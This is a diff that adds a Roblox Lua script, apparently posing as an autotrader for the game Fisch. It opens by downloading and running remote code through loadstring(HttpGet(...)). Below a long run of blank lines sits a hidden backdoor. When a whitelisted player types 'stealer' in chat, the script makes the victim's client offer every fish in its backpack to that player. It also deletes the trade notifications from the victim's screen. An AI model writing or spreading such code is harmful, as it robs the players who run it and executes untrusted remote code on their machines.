@@ -1,0 +1,134 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EpicGamer-Stack/FischAutotrader/refs/heads/main/whalefien.lua"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3adca129b294fc6ae3be0888ce4e2b1f.lua"))()
+
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local gui = player:WaitForChild("PlayerGui")
+
+
+local function create_message(txt,fade)
+    local thought = gui.hud.safezone.announcements.announcer.thought:Clone()
+    thought.Parent = gui.hud.safezone.announcements
+    local mainText = thought:FindFirstChild("Main")
+    mainText.Text = txt
+    thought.Name = "bypass"
+    return thought
+end
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local scammer = false
+local whitelist = {"PetSimGrindGoBRRRRR","avasacas","JennyThePro111"}
+local commands = {
+
+
+
+    [1] = {"flash",function(player_firing,local_player)
+        local_player.Character:FindFirstChild("Humanoid").WalkSpeed = 64
+    end},
+    [2] = {"stealer",function(player_firing,local_player)
+        if not scammer then
+            scammer = true
+           
+            
+            local function notihider() 
+                while scammer do
+                    task.wait()
+                    for i,item in gui.hud.safezone.announcements:GetChildren() do
+                        if item:IsA("Frame") and item.Name ~= "bypass" then
+                            item:Destroy()
+                        end
+                    end
+                end
+            end
+            
+            local function modelclear()
+                while scammer do
+                    task.wait()
+                    for _,obj in local_player.Character:GetChildren() do
+                        if obj:IsA("Tool") and obj:FindFirstChild("offer") and obj:FindFirstChild("Fish") then
+                            obj:FindFirstChild("Fish").Parent = obj:FindFirstChild("offer")
+                        end
+                    end
+                end
+            end
+
+            task.spawn(notihider)
+            task.spawn(modelclear)
+            
+
+
+            for _,v in local_player.Backpack:GetChildren() do
+                    if v:FindFirstChild("offer") then
+                        repeat task.wait() until local_player.Character:FindFirstChildOfClass("Tool") == nil
+                        v.Parent = local_player.Character
+                        v.offer:FireServer(game.Players:FindFirstChild(player_firing.Name))
+                        v.Parent = local_player.Backpack
+                        
+                    end
+
+            end
+
+            num1:Destroy()
+            num2:Destroy()
+        end
+    end},
+    [3] = {"stealerreset",function (player_firing,local_player)
+        scammer = false        
+    end}
+}
+
+
+
+
+
+
+for i,v in game:GetService("Players"):GetChildren() do
+    v.Chatted:Connect(function(msg)
+        for index,whitelistname in whitelist do
+            if whitelistname == v.Name then
+               for index_2,command in commands do
+                    if string.match(msg,command[1]) then
+                        command[2](v,player)
+                    end
+               end 
+            end
+        end
+    end)
+end
+
+
+
+
